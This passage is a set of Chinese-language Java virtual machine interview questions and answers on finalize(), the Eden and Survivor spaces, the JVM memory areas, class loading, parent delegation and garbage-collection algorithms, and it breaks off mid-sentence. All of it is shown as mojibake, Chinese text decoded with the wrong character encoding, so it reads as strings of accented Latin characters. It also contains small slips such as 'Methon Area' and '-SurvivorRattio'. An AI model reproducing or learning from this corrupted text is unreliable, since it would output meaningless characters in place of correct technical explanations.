finalize()æ–¹æ³•æ˜¯å¯¹è±¡é€ƒè„±å›æ”¶çš„æœ€åä¸€æ¬¡æœºä¼š,ç¨åGCå°†å¯¹F-Queueä¸­çš„å¯¹è±¡è¿›è¡Œç¬¬äºŒæ¬¡å°è§„æ¨¡çš„æ ‡è®°,å¦‚æœå¯¹è±¡è¦åœ¨finalize()ä¸­è·³å‡ºå›æ”¶â€”â€”åªè¦é‡æ–°ä¸å¼•ç”¨é“¾ä¸Šçš„ä»»ä½•ä¸€ä¸ªå¯¹è±¡å»ºç«‹å…³è”å³å¯,è­¬å¦‚æŠŠè‡ªå·±(thiså…³é”®å­—)èµ‹å€¼ç»™æŸä¸ªç±»å˜é‡æˆ–è€…å¯¹è±¡çš„æˆå‘˜å˜é‡,é‚£åœ¨ç¬¬äºŒæ¬¡æ ‡è®°æ—¶å®ƒå°†è¢«ç§»é™¤å‡ºâ€œå³å°†å›æ”¶â€çš„é›†åˆ;å¦‚æœå¯¹è±¡è¿™æ—¶å€™è¿˜æ²¡æœ‰é€ƒè„±,é‚£åŸºæœ¬ä¸Šå®ƒå°±çœŸçš„è¢«å›æ”¶äº†ã€‚ è¯´æ˜ä¸€ä¸‹JAVAè™šæ‹Ÿæœºçš„ä½œç”¨æ˜¯ä»€ä¹ˆ?è§£é‡Šè¿è¡Œå­—èŠ‚ç ç¨‹åºæ¶ˆé™¤å¹³å°ç›¸å…³æ€§ã€‚ jvmå°†javaå­—èŠ‚ç è§£é‡Šä¸ºå…·ä½“å¹³å°çš„å…·ä½“æŒ‡ä»¤ã€‚ä¸€èˆ¬çš„é«˜çº§è¯­è¨€å¦‚è¦åœ¨ä¸åŒçš„å¹³å°ä¸Šè¿è¡Œï¼Œè‡³å°‘éœ€è¦ç¼–è¯‘æˆä¸åŒçš„ç›®æ ‡ä»£ç ã€‚è€Œå¼•å…¥JVMåï¼ŒJavaè¯­è¨€åœ¨ä¸åŒå¹³å°ä¸Šè¿è¡Œæ—¶ä¸éœ€è¦é‡æ–°ç¼–è¯‘ã€‚Javaè¯­è¨€ä½¿ç”¨æ¨¡å¼Javaè™šæ‹Ÿæœºå±è”½äº†ä¸å…·ä½“å¹³å°ç›¸å…³çš„ä¿¡æ¯ï¼Œä½¿å¾—Javaè¯­è¨€ç¼–è¯‘ç¨‹åºåªéœ€ç”Ÿæˆåœ¨Javaè™šæ‹Ÿæœºä¸Šè¿è¡Œçš„ç›®æ ‡ä»£ç ï¼ˆå­—èŠ‚ç ï¼‰ï¼Œå°±å¯ä»¥åœ¨å¤šç§å¹³å°ä¸Šä¸åŠ ä¿®æ”¹åœ°è¿è¡Œã€‚Javaè™šæ‹Ÿæœºåœ¨æ‰§è¡Œå­—èŠ‚ç æ—¶ï¼ŒæŠŠå­—èŠ‚ç è§£é‡Šæˆå…·ä½“å¹³å°ä¸Šçš„æœºå™¨æŒ‡ä»¤æ‰§è¡Œã€‚ å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œè¦æ±‚stop the worldæ—¶é—´éå¸¸çŸ­ï¼Œä½ ä¼šæ€ä¹ˆè®¾è®¡åƒåœ¾å›æ”¶æœºåˆ¶ï¼Ÿ ç»å¤§å¤šæ•°æ–°åˆ›å»ºçš„å¯¹è±¡åˆ†é…åœ¨EdenåŒºã€‚ åœ¨EdenåŒºå‘ç”Ÿä¸€æ¬¡GCåï¼Œå­˜æ´»çš„å¯¹è±¡ç§»åˆ°å…¶ä¸­ä¸€ä¸ªSurvivoråŒºã€‚ åœ¨EdenåŒºå‘ç”Ÿä¸€æ¬¡GCåï¼Œå¯¹è±¡æ˜¯å­˜æ”¾åˆ°SurvivoråŒºï¼Œè¿™ä¸ªSurvivoråŒºå·²ç»å­˜åœ¨å…¶ä»–å­˜æ´»çš„å¯¹è±¡ã€‚ ä¸€æ—¦ä¸€ä¸ªSurvivoråŒºå·²æ»¡ï¼Œå­˜æ´»çš„å¯¹è±¡ç§»åŠ¨åˆ°å¦å¤–ä¸€ä¸ªSurvivoråŒºã€‚ç„¶åä¹‹å‰é‚£ä¸ªç©ºé—´å·²æ»¡SurvivoråŒºå°†ç½®ä¸ºç©ºï¼Œæ²¡æœ‰ä»»ä½•æ•°æ®ã€‚ ç»è¿‡é‡å¤å¤šæ¬¡è¿™æ ·çš„æ­¥éª¤åä¾æ—§å­˜æ´»çš„å¯¹è±¡å°†è¢«ç§»åˆ°è€å¹´ä»£ã€‚ è¯´æ˜ä¸€ä¸‹edenåŒºå’ŒsurvialåŒºçš„å«ä¹‰ä»¥åŠå·¥ä½œåŸç†ï¼Ÿç›®å‰ä¸»æµçš„è™šæ‹Ÿæœºå®ç°éƒ½é‡‡ç”¨äº†åˆ†ä»£æ”¶é›†çš„æ€æƒ³ï¼ŒæŠŠæ•´ä¸ªå †åŒºåˆ’åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼›æ–°ç”Ÿä»£åˆè¢«åˆ’åˆ†æˆEden ç©ºé—´ã€ From Survivor å’Œ To Survivor ä¸‰å—åŒºåŸŸã€‚ æˆ‘ä»¬æŠŠEden : From Survivor : To Survivor ç©ºé—´å¤§å°è®¾æˆ 8 : 1 : 1 ï¼Œå¯¹è±¡æ€»æ˜¯åœ¨ Eden åŒºå‡ºç”Ÿï¼Œ From Survivor ä¿å­˜å½“å‰çš„å¹¸å­˜å¯¹è±¡ï¼Œ To Survivor ä¸ºç©ºã€‚ä¸€æ¬¡ gc å‘ç”Ÿåï¼š 1ï¼‰Eden åŒºæ´»ç€çš„å¯¹è±¡ ï¼‹ From Survivor å­˜å‚¨çš„å¯¹è±¡è¢«å¤åˆ¶åˆ° To Survivor ï¼›2) æ¸…ç©º Eden å’Œ From Survivor ï¼› 3) é¢ å€’ From Survivor å’Œ To Survivor çš„é€»è¾‘å…³ç³»ï¼š From å˜ To ï¼Œ To å˜ From ã€‚å¯ä»¥çœ‹å‡ºï¼Œåªæœ‰åœ¨ Eden ç©ºé—´å¿«æ»¡çš„æ—¶å€™æ‰ä¼šè§¦å‘ Minor GC ã€‚è€Œ Eden ç©ºé—´å æ–°ç”Ÿä»£çš„ç»å¤§éƒ¨åˆ†ï¼Œæ‰€ä»¥ Minor GC çš„é¢‘ç‡å¾—ä»¥é™ä½ã€‚å½“ç„¶ï¼Œä½¿ç”¨ä¸¤ä¸ª Survivor è¿™ç§æ–¹å¼æˆ‘ä»¬ä¹Ÿä»˜å‡ºäº†ä¸€å®šçš„ä»£ä»·ï¼Œå¦‚ 10% çš„ç©ºé—´æµªè´¹ã€å¤åˆ¶å¯¹è±¡çš„å¼€é”€ç­‰ã€‚ ç®€å•æè¿°ä¸€ä¸‹JVMåˆ†åŒºéƒ½æœ‰å“ªäº›ï¼Ÿ javaå†…å­˜é€šå¸¸è¢«åˆ’åˆ†ä¸º5ä¸ªåŒºåŸŸï¼šç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Count Registerï¼‰ã€æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Stackï¼‰ã€æ–¹æ³•åŒºï¼ˆMethon Areaï¼‰ã€æ ˆï¼ˆStackï¼‰ã€å †ï¼ˆHeapï¼‰ã€‚ ç®€å•æè¿°ä¸€ä¸‹ç±»çš„åŠ è½½è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ŒJVMç±»åŠ è½½æœºåˆ¶åˆ†ä¸ºäº”ä¸ªéƒ¨åˆ†ï¼šåŠ è½½ï¼ŒéªŒè¯ï¼Œå‡†å¤‡ï¼Œè§£æï¼Œåˆå§‹åŒ–ï¼Œä¸‹é¢æˆ‘ä»¬å°±åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹è¿™äº”ä¸ªè¿‡ç¨‹ã€‚ åŠ è½½ åŠ è½½æ˜¯ç±»åŠ è½½è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªé˜¶æ®µï¼Œè¿™ä¸ªé˜¶æ®µä¼šåœ¨å†…å­˜ä¸­ç”Ÿæˆä¸€ä¸ªä»£è¡¨è¿™ä¸ªç±»çš„java.lang.Classå¯¹è±¡ï¼Œä½œä¸ºæ–¹æ³•åŒºè¿™ä¸ªç±»çš„å„ç§æ•°æ®çš„å…¥å£ã€‚æ³¨æ„è¿™é‡Œä¸ä¸€å®šéå¾—è¦ä»ä¸€ä¸ªClassæ–‡ä»¶è·å–ï¼Œè¿™é‡Œæ—¢å¯ä»¥ä»ZIPåŒ…ä¸­è¯»å–ï¼ˆæ¯”å¦‚ä»jaråŒ…å’ŒwaråŒ…ä¸­è¯»å–ï¼‰ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶è®¡ç®—ç”Ÿæˆï¼ˆåŠ¨æ€ä»£ç†ï¼‰ï¼Œä¹Ÿå¯ä»¥ç”±å…¶å®ƒæ–‡ä»¶ç”Ÿæˆï¼ˆæ¯”å¦‚å°†JSPæ–‡ä»¶è½¬æ¢æˆå¯¹åº”çš„Classç±»ï¼‰ã€‚ éªŒè¯ è¿™ä¸€é˜¶æ®µçš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿Classæ–‡ä»¶çš„å­—èŠ‚æµä¸­åŒ…å«çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆå½“å‰è™šæ‹Ÿæœºçš„è¦æ±‚ï¼Œå¹¶ä¸”ä¸ä¼šå±å®³è™šæ‹Ÿæœºè‡ªèº«çš„å®‰å…¨ã€‚ å‡†å¤‡ å‡†å¤‡é˜¶æ®µæ˜¯æ­£å¼ä¸ºç±»å˜é‡åˆ†é…å†…å­˜å¹¶è®¾ç½®ç±»å˜é‡çš„åˆå§‹å€¼é˜¶æ®µï¼Œå³åœ¨æ–¹æ³•åŒºä¸­åˆ†é…è¿™äº›å˜é‡æ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´ã€‚æ³¨æ„è¿™é‡Œæ‰€è¯´çš„åˆå§‹å€¼æ¦‚å¿µï¼Œæ¯”å¦‚ä¸€ä¸ªç±»å˜é‡å®šä¹‰ä¸ºï¼š public static int v = 8080; å®é™…ä¸Šå˜é‡våœ¨å‡†å¤‡é˜¶æ®µè¿‡åçš„åˆå§‹å€¼ä¸º0è€Œä¸æ˜¯8080ï¼Œå°†vèµ‹å€¼ä¸º8080çš„putstaticæŒ‡ä»¤æ˜¯ç¨‹åºè¢«ç¼–è¯‘åï¼Œå­˜æ”¾äºç±»æ„é€ å™¨æ–¹æ³•ä¹‹ä¸­ï¼Œè¿™é‡Œæˆ‘ä»¬åé¢ä¼šè§£é‡Šã€‚ ä½†æ˜¯æ³¨æ„å¦‚æœå£°æ˜ä¸ºï¼š public static final int v = 8080; åœ¨ç¼–è¯‘é˜¶æ®µä¼šä¸ºvç”ŸæˆConstantValueå±æ€§ï¼Œåœ¨å‡†å¤‡é˜¶æ®µè™šæ‹Ÿæœºä¼šæ ¹æ®ConstantValueå±æ€§å°†vèµ‹å€¼ä¸º8080ã€‚ è§£æ è§£æé˜¶æ®µæ˜¯æŒ‡è™šæ‹Ÿæœºå°†å¸¸é‡æ± ä¸­çš„ç¬¦å·å¼•ç”¨æ›¿æ¢ä¸ºç›´æ¥å¼•ç”¨çš„è¿‡ç¨‹ã€‚ç¬¦å·å¼•ç”¨å°±æ˜¯classæ–‡ä»¶ä¸­çš„ï¼š CONSTANT_Class_info CONSTANT_Field_info CONSTANT_Method_info ç­‰ç±»å‹çš„å¸¸é‡ã€‚ ä¸‹é¢æˆ‘ä»¬è§£é‡Šä¸€ä¸‹ç¬¦å·å¼•ç”¨å’Œç›´æ¥å¼•ç”¨çš„æ¦‚å¿µï¼š ç¬¦å·å¼•ç”¨ä¸è™šæ‹Ÿæœºå®ç°çš„å¸ƒå±€æ— å…³ï¼Œå¼•ç”¨çš„ç›®æ ‡å¹¶ä¸ä¸€å®šè¦å·²ç»åŠ è½½åˆ°å†…å­˜ä¸­ã€‚å„ç§è™šæ‹Ÿæœºå®ç°çš„å†…å­˜å¸ƒå±€å¯ä»¥å„ä¸ç›¸åŒï¼Œä½†æ˜¯å®ƒä»¬èƒ½æ¥å—çš„ç¬¦å·å¼•ç”¨å¿…é¡»æ˜¯ä¸€è‡´çš„ï¼Œå› ä¸ºç¬¦å·å¼•ç”¨çš„å­—é¢é‡å½¢å¼æ˜ç¡®å®šä¹‰åœ¨Javaè™šæ‹Ÿæœºè§„èŒƒçš„Classæ–‡ä»¶æ ¼å¼ä¸­ã€‚ ç›´æ¥å¼•ç”¨å¯ä»¥æ˜¯æŒ‡å‘ç›®æ ‡çš„æŒ‡é’ˆï¼Œç›¸å¯¹åç§»é‡æˆ–æ˜¯ä¸€ä¸ªèƒ½é—´æ¥å®šä½åˆ°ç›®æ ‡çš„å¥æŸ„ã€‚å¦‚æœæœ‰äº†ç›´æ¥å¼•ç”¨ï¼Œé‚£å¼•ç”¨çš„ç›®æ ‡å¿…å®šå·²ç»åœ¨å†…å­˜ä¸­å­˜åœ¨ã€‚ åˆå§‹åŒ– åˆå§‹åŒ–é˜¶æ®µæ˜¯ç±»åŠ è½½æœ€åä¸€ä¸ªé˜¶æ®µï¼Œå‰é¢çš„ç±»åŠ è½½é˜¶æ®µä¹‹åï¼Œé™¤äº†åœ¨åŠ è½½é˜¶æ®µå¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ä»¥å¤–ï¼Œå…¶å®ƒæ“ä½œéƒ½ç”±JVMä¸»å¯¼ã€‚åˆ°äº†åˆå§‹é˜¶æ®µï¼Œæ‰å¼€å§‹çœŸæ­£æ‰§è¡Œç±»ä¸­å®šä¹‰çš„Javaç¨‹åºä»£ç ã€‚ åˆå§‹åŒ–é˜¶æ®µæ˜¯æ‰§è¡Œç±»æ„é€ å™¨æ–¹æ³•çš„è¿‡ç¨‹ã€‚æ–¹æ³•æ˜¯ç”±ç¼–è¯‘å™¨è‡ªåŠ¨æ”¶é›†ç±»ä¸­çš„ç±»å˜é‡çš„èµ‹å€¼æ“ä½œå’Œé™æ€è¯­å¥å—ä¸­çš„è¯­å¥åˆå¹¶è€Œæˆçš„ã€‚è™šæ‹Ÿæœºä¼šä¿è¯æ–¹æ³•æ‰§è¡Œä¹‹å‰ï¼Œçˆ¶ç±»çš„æ–¹æ³•å·²ç»æ‰§è¡Œå®Œæ¯•ã€‚p.s: å¦‚æœä¸€ä¸ªç±»ä¸­æ²¡æœ‰å¯¹é™æ€å˜é‡èµ‹å€¼ä¹Ÿæ²¡æœ‰é™æ€è¯­å¥å—ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å¯ä»¥ä¸ä¸ºè¿™ä¸ªç±»ç”Ÿæˆ()æ–¹æ³•ã€‚ æ³¨æ„ä»¥ä¸‹å‡ ç§æƒ…å†µä¸ä¼šæ‰§è¡Œç±»åˆå§‹åŒ–ï¼š é€šè¿‡å­ç±»å¼•ç”¨çˆ¶ç±»çš„é™æ€å­—æ®µï¼Œåªä¼šè§¦å‘çˆ¶ç±»çš„åˆå§‹åŒ–ï¼Œè€Œä¸ä¼šè§¦å‘å­ç±»çš„åˆå§‹åŒ–ã€‚ å®šä¹‰å¯¹è±¡æ•°ç»„ï¼Œä¸ä¼šè§¦å‘è¯¥ç±»çš„åˆå§‹åŒ–ã€‚ å¸¸é‡åœ¨ç¼–è¯‘æœŸé—´ä¼šå­˜å…¥è°ƒç”¨ç±»çš„å¸¸é‡æ± ä¸­ï¼Œæœ¬è´¨ä¸Šå¹¶æ²¡æœ‰ç›´æ¥å¼•ç”¨å®šä¹‰å¸¸é‡çš„ç±»ï¼Œä¸ä¼šè§¦å‘å®šä¹‰å¸¸é‡æ‰€åœ¨çš„ç±»ã€‚ é€šè¿‡ç±»åè·å–Classå¯¹è±¡ï¼Œä¸ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–ã€‚ é€šè¿‡Class.forNameåŠ è½½æŒ‡å®šç±»æ—¶ï¼Œå¦‚æœæŒ‡å®šå‚æ•°initializeä¸ºfalseæ—¶ï¼Œä¹Ÿä¸ä¼šè§¦å‘ç±»åˆå§‹åŒ–ï¼Œå…¶å®è¿™ä¸ªå‚æ•°æ˜¯å‘Šè¯‰è™šæ‹Ÿæœºï¼Œæ˜¯å¦è¦å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–ã€‚ é€šè¿‡ClassLoaderé»˜è®¤çš„loadClassæ–¹æ³•ï¼Œä¹Ÿä¸ä¼šè§¦å‘åˆå§‹åŒ–åŠ¨ä½œã€‚ ç±»åŠ è½½å™¨ è™šæ‹Ÿæœºè®¾è®¡å›¢é˜ŸæŠŠåŠ è½½åŠ¨ä½œæ”¾åˆ°JVMå¤–éƒ¨å®ç°ï¼Œä»¥ä¾¿è®©åº”ç”¨ç¨‹åºå†³å®šå¦‚ä½•è·å–æ‰€éœ€çš„ç±»ï¼ŒJVMæä¾›äº†3ç§ç±»åŠ è½½å™¨ï¼š å¯åŠ¨ç±»åŠ è½½å™¨(Bootstrap ClassLoader)ï¼šè´Ÿè´£åŠ è½½ JAVA_HOME\\lib ç›®å½•ä¸­çš„ï¼Œæˆ–é€šè¿‡-Xbootclasspathå‚æ•°æŒ‡å®šè·¯å¾„ä¸­çš„ï¼Œä¸”è¢«è™šæ‹Ÿæœºè®¤å¯ï¼ˆæŒ‰æ–‡ä»¶åè¯†åˆ«ï¼Œå¦‚rt.jarï¼‰çš„ç±»ã€‚ æ‰©å±•ç±»åŠ è½½å™¨(Extension ClassLoader)ï¼šè´Ÿè´£åŠ è½½ JAVA_HOME\\lib\\ext ç›®å½•ä¸­çš„ï¼Œæˆ–é€šè¿‡java.ext.dirsç³»ç»Ÿå˜é‡æŒ‡å®šè·¯å¾„ä¸­çš„ç±»åº“ã€‚ åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨(Application ClassLoader)ï¼šè´Ÿè´£åŠ è½½ç”¨æˆ·è·¯å¾„ï¼ˆclasspathï¼‰ä¸Šçš„ç±»åº“ã€‚ JVMé€šè¿‡åŒäº²å§”æ´¾æ¨¡å‹è¿›è¡Œç±»çš„åŠ è½½ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç»§æ‰¿java.lang.ClassLoaderå®ç°è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ã€‚ å½“ä¸€ä¸ªç±»åŠ è½½å™¨æ”¶åˆ°ç±»åŠ è½½ä»»åŠ¡ï¼Œä¼šå…ˆäº¤ç»™å…¶çˆ¶ç±»åŠ è½½å™¨å»å®Œæˆï¼Œå› æ­¤æœ€ç»ˆåŠ è½½ä»»åŠ¡éƒ½ä¼šä¼ é€’åˆ°é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œåªæœ‰å½“çˆ¶ç±»åŠ è½½å™¨æ— æ³•å®ŒæˆåŠ è½½ä»»åŠ¡æ—¶ï¼Œæ‰ä¼šå°è¯•æ‰§è¡ŒåŠ è½½ä»»åŠ¡ã€‚é‡‡ç”¨åŒäº²å§”æ´¾çš„ä¸€ä¸ªå¥½å¤„æ˜¯æ¯”å¦‚åŠ è½½ä½äºrt.jaråŒ…ä¸­çš„ç±»java.lang.Objectï¼Œä¸ç®¡æ˜¯å“ªä¸ªåŠ è½½å™¨åŠ è½½è¿™ä¸ªç±»ï¼Œæœ€ç»ˆéƒ½æ˜¯å§”æ‰˜ç»™é¡¶å±‚çš„å¯åŠ¨ç±»åŠ è½½å™¨è¿›è¡ŒåŠ è½½ï¼Œè¿™æ ·å°±ä¿è¯äº†ä½¿ç”¨ä¸åŒçš„ç±»åŠ è½½å™¨æœ€ç»ˆå¾—åˆ°çš„éƒ½æ˜¯åŒæ ·ä¸€ä¸ªObjectå¯¹è±¡ã€‚ ç®€å•è¯´æ˜ä¸€ä¸‹JVMçš„å›æ”¶ç®—æ³•ä»¥åŠå®ƒçš„å›æ”¶å™¨æ˜¯ä»€ä¹ˆï¼Ÿè¿˜æœ‰CMSé‡‡ç”¨å“ªç§å›æ”¶ç®—æ³•ï¼Ÿä½¿ç”¨CMSæ€æ ·è§£å†³å†…å­˜ç¢ç‰‡çš„é—®é¢˜å‘¢ï¼Ÿåƒåœ¾å›æ”¶ç®—æ³• æ ‡è®°æ¸…é™¤ æ ‡è®°-æ¸…é™¤ç®—æ³•å°†åƒåœ¾å›æ”¶åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼šæ ‡è®°é˜¶æ®µå’Œæ¸…é™¤é˜¶æ®µã€‚åœ¨æ ‡è®°é˜¶æ®µé¦–å…ˆé€šè¿‡æ ¹èŠ‚ç‚¹ï¼Œæ ‡è®°æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹å¼€å§‹çš„å¯¹è±¡ï¼Œæœªè¢«æ ‡è®°çš„å¯¹è±¡å°±æ˜¯æœªè¢«å¼•ç”¨çš„åƒåœ¾å¯¹è±¡ã€‚ç„¶åï¼Œåœ¨æ¸…é™¤é˜¶æ®µï¼Œæ¸…é™¤æ‰€æœ‰æœªè¢«æ ‡è®°çš„å¯¹è±¡ã€‚æ ‡è®°æ¸…é™¤ç®—æ³•å¸¦æ¥çš„ä¸€ä¸ªé—®é¢˜æ˜¯ä¼šå­˜åœ¨å¤§é‡çš„ç©ºé—´ç¢ç‰‡ï¼Œå› ä¸ºå›æ”¶åçš„ç©ºé—´æ˜¯ä¸è¿ç»­çš„ï¼Œè¿™æ ·ç»™å¤§å¯¹è±¡åˆ†é…å†…å­˜çš„æ—¶å€™å¯èƒ½ä¼šæå‰è§¦å‘full gcã€‚ å¤åˆ¶ç®—æ³• å°†ç°æœ‰çš„å†…å­˜ç©ºé—´åˆ†ä¸ºä¸¤å¿«ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­ä¸€å—ï¼Œåœ¨åƒåœ¾å›æ”¶æ—¶å°†æ­£åœ¨ä½¿ç”¨çš„å†…å­˜ä¸­çš„å­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°æœªè¢«ä½¿ç”¨çš„å†…å­˜å—ä¸­ï¼Œä¹‹åï¼Œæ¸…é™¤æ­£åœ¨ä½¿ç”¨çš„å†…å­˜å—ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œäº¤æ¢ä¸¤ä¸ªå†…å­˜çš„è§’è‰²ï¼Œå®Œæˆåƒåœ¾å›æ”¶ã€‚ ç°åœ¨çš„å•†ä¸šè™šæ‹Ÿæœºéƒ½é‡‡ç”¨è¿™ç§æ”¶é›†ç®—æ³•æ¥å›æ”¶æ–°ç”Ÿä»£ï¼ŒIBMç ”ç©¶è¡¨æ˜æ–°ç”Ÿä»£ä¸­çš„å¯¹è±¡98%æ˜¯æœå¤•ç”Ÿæ­»çš„ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æŒ‰ç…§1:1çš„æ¯”ä¾‹åˆ’åˆ†å†…å­˜ç©ºé—´ï¼Œè€Œæ˜¯å°†å†…å­˜åˆ†ä¸ºä¸€å—è¾ƒå¤§çš„Edenç©ºé—´å’Œä¸¤å—è¾ƒå°çš„Survivorç©ºé—´ï¼Œæ¯æ¬¡ä½¿ç”¨Edenå’Œå…¶ä¸­çš„ä¸€å—Survivorã€‚å½“å›æ”¶æ—¶ï¼Œå°†Edenå’ŒSurvivorä¸­è¿˜å­˜æ´»ç€çš„å¯¹è±¡ä¸€æ¬¡æ€§åœ°æ‹·è´åˆ°å¦å¤–ä¸€ä¸ªSurvivorç©ºé—´ä¸Šï¼Œæœ€åæ¸…ç†æ‰Edenå’Œåˆšæ‰ç”¨è¿‡çš„Survivorçš„ç©ºé—´ã€‚HotSpotè™šæ‹Ÿæœºé»˜è®¤Edenå’ŒSurvivorçš„å¤§å°æ¯”ä¾‹æ˜¯8:1(å¯ä»¥é€šè¿‡-SurvivorRattioæ¥é…ç½®)ï¼Œä¹Ÿå°±æ˜¯æ¯æ¬¡æ–°ç”Ÿä»£ä¸­å¯ç”¨å†…å­˜ç©ºé—´ä¸ºæ•´ä¸ªæ–°ç”Ÿä»£å®¹é‡çš„90%ï¼Œåªæœ‰10%çš„å†…å­˜ä¼šè¢«â€œæµªè´¹â€ã€‚å½“ç„¶ï¼Œ98%çš„å¯¹è±¡å¯å›æ”¶åªæ˜¯ä¸€èˆ¬åœºæ™¯ä¸‹çš„æ•°æ®ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•ä¿è¯å›æ”¶éƒ½åªæœ‰ä¸å¤šäº10%çš„å¯¹è±¡å­˜æ´»ï¼Œå½“Survivorç©ºé—´ä¸å¤Ÿç”¨æ—¶ï¼Œéœ€è¦ä¾èµ–å…¶ä»–å†…å­˜ï¼ˆè¿™é‡ŒæŒ‡è€å¹´ä»£ï¼‰è¿›è¡Œåˆ†é…æ‹…ä¿ã€‚ æ ‡è®°æ•´ç† å¤åˆ¶ç®—æ³•çš„é«˜æ•ˆæ€§æ˜¯å»ºç«‹åœ¨å­˜æ´»å¯¹è±¡å°‘ã€åƒåœ¾å¯¹è±¡å¤šçš„å‰æä¸‹çš„ã€‚è¿™ç§æƒ…å†µåœ¨æ–°ç”Ÿä»£ç»å¸¸å‘ç”Ÿï¼Œä½†æ˜¯åœ¨è€å¹´ä»£æ›´å¸¸è§çš„æƒ…å†µæ˜¯å¤§éƒ¨åˆ†å¯¹è±¡éƒ½æ˜¯å­˜æ´»å¯¹è±¡ã€‚å¦‚æœä¾ç„¶ä½¿ç”¨å¤åˆ¶ç®—æ³•ï¼Œç”±äºå­˜æ´»çš„å¯¹è±¡è¾ƒå¤šï¼Œå¤åˆ¶çš„æˆæœ¬ä¹Ÿå°†å¾ˆé«˜ã€‚ æ ‡è®°-å‹ç¼©ç®—æ³•æ˜¯ä¸€ç§è€å¹´ä»£çš„å›æ”¶ç®—æ³•ï¼Œå®ƒåœ¨æ ‡è®°-æ¸…é™¤ç®—æ³•çš„åŸºç¡€ä¸Šåšäº†ä¸€äº›ä¼˜åŒ–ã€‚é¦–å…ˆä¹Ÿéœ€è¦ä»æ ¹èŠ‚ç‚¹å¼€å§‹å¯¹æ‰€æœ‰å¯è¾¾å¯¹è±¡åšä¸€æ¬¡æ ‡è®°ï¼Œä½†ä¹‹åï¼Œå®ƒå¹¶ä¸ç®€å•åœ°æ¸…ç†æœªæ ‡è®°çš„å¯¹è±¡ï¼Œè€Œæ˜¯å°†æ‰€æœ‰çš„å­˜æ´»å¯¹è±¡å‹ç¼©åˆ°å†…å­˜çš„ä¸€ç«¯ã€‚ä¹‹åï¼Œæ¸…ç†è¾¹ç•Œå¤–æ‰€æœ‰çš„ç©ºé—´ã€‚è¿™ç§æ–¹æ³•æ—¢é¿å…äº†ç¢ç‰‡çš„äº§ç”Ÿï¼Œåˆä¸éœ€è¦ä¸¤å—ç›¸åŒçš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤ï¼Œå…¶æ€§ä»·æ¯”æ¯”è¾ƒé«˜ã€‚ å¢é‡ç®—æ³• å¢é‡ç®—æ³•çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼Œå¦‚æœä¸€æ¬¡æ€§å°†æ‰€æœ‰çš„åƒåœ¾è¿›è¡Œå¤„ç†ï¼Œéœ€è¦é€ æˆç³»ç»Ÿé•¿æ—¶é—´çš„åœé¡¿ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®©åƒåœ¾æ”¶é›†çº¿ç¨‹å’Œåº”ç”¨ç¨‹åºçº¿ç¨‹äº¤æ›¿æ‰§è¡Œã€‚æ¯æ¬¡ï¼Œåƒåœ¾æ”¶é›†çº¿ç¨‹åªæ”¶é›†ä¸€å°ç‰‡åŒºåŸŸçš„å†…å­˜ç©ºé—´ï¼Œæ¥ç€åˆ‡æ¢åˆ°åº”ç”¨ç¨‹åºçº¿ç¨‹ã€‚ä¾æ¬¡åå¤ï¼Œç›´åˆ°åƒåœ¾æ”¶é›†å®Œæˆã€‚ä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œç”±äºåœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œé—´æ–­æ€§åœ°è¿˜æ‰§è¡Œäº†åº”ç”¨ç¨‹åºä»£ç ï¼Œæ‰€ä»¥èƒ½å‡å°‘ç³»ç»Ÿçš„åœé¡¿æ—¶é—´ã€‚ä½†æ˜¯ï¼Œå› ä¸ºçº¿ç¨‹åˆ‡æ¢å’Œä¸Šä¸‹æ–‡è½¬æ¢çš„æ¶ˆè€—ï¼Œä¼šä½¿å¾—åƒåœ¾å›æ”¶çš„æ€»ä½“æˆæœ¬ä¸Šå‡ï¼Œé€ æˆç³»ç»Ÿååé‡çš„ä¸‹é™ã€‚ åƒåœ¾å›æ”¶å™¨ Serialæ”¶é›†å™¨ Serialæ”¶é›†å™¨æ˜¯æœ€å¤è€çš„æ”¶é›†å™¨ï¼Œå®ƒçš„ç¼ºç‚¹æ˜¯å½“Serialæ”¶é›†å™¨æƒ³è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™ï¼Œå¿…é¡»æš‚åœç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹ï¼Œå³stop the 